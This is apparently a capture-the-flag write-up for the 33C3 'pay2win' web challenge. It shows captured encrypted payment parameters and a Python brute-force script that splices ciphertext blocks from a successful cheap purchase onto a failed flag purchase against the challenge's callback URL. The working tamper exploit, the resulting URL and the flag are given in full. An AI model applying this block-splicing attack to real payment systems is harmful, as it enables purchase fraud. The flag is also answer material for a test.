<h2>pay2win (Web-200)</h2>

<blockquote>
  <p>Writeup by rnehra01(Ravinder Nehra)</p>
</blockquote>

<h3>Description</h3>

<p>Do you have enough money to buy the flag?</p>

<h3>Solution</h3>

<p>So the challenge was an easy one. <code>Cheap</code> can be bought by entering a valid credit card but purchase failed for <code>flag</code>. After looking at the challenge for a very long time, <code>data</code> parameter in the URL looked suspicious.</p>

<p>[<code>data</code> during buying of <code>flag</code>]
<code>
f1=5e4ec20070a567e0e3408e92be677178ee8cbd062a60582b4f75c9736d3b8e0641e7995bb92506da1ac7f8da5a628e19ae39825a916d8a2f
f2=5e4ec20070a567e0e3408e92be677178d238c1d6d01839664f75c9736d3b8e0641e7995bb92506da1ac7f8da5a628e19ae39825a916d8a2f 
</code>
[<code>data</code> contents during buying of <code>cheap</code>]
<code>
c1=5e4ec20070a567e0e3408e92be6771789c68e186a73ad0df3b5b0554edda4f8828df361f896eb3c3706cda0474915040
c2=5e4ec20070a567e0e3408e92be677178ae6633fbd9d624ff3b5b0554edda4f8828df361f896eb3c3706cda0474915040
c3=5e4ec20070a567e0e3408e92be677178a1e8f028a2ce7c2a3b5b0554edda4f8828df361f896eb3c3706cda0474915040
</code>
[<code>data</code> contents after failed purchase]
<code>
ff1=232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3de871eef719f5fde02f7ef761e2bbe791
ff2=232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791
</code>
[<code>data</code> contents after successful purchase]
<code>
cp1=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8dca8a210beb51eda28df361f896eb3c3706cda0474915040
cp2=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c86117e55fc22ad33f28df361f896eb3c3706cda0474915040
cp3=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c81f381a6fcd665bdb28df361f896eb3c3706cda0474915040
</code></p>

<p>So, three successful purhases of <code>cheap</code> gave same prefix and prefix changed in unsuccessful purchase.
Also suffix of <code>c1</code> and <code>cp1</code> are same, so most probably they contain information about <code>product name</code> and suffix contain <code>purchase status</code> </p>

<p>Initially I tried to decode the data contents but got no luck.
So I just tried to brute-force the prefix using the script.</p>

<p>```
import requests</p>

<h1>failed purchase for flag</h1>

<p>ff='232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791'</p>

<h1>good purchase for cheap</h1>

<p>cp='5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8dca8a210beb51eda28df361f896eb3c3706cda0474915040'</p>

<p>url = 'http://78.46.224.78:5000/payment/callback?data='</p>

<p>for i in range(0,50):
    data = cp[:i]+ff[i:]
    print 'Trying : ',url+data
    r=requests.get(url+data)</p>

<pre><code>if (r.status_code == 200):
    print r.text
    if ('flag' in r.text):
        break
</code></pre>

<p>```</p>

<p>And got the flag at <code>http://78.46.224.78:5000/payment/callback?data=5765679f0870f4309b1a3c83588024d7650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791</code></p>

<p>Flag : <code>33C3_3c81d6357a9099a7c091d6c7d71343075e7f8a46d55c593f0ade8f51ac8ae1a8</code></p>
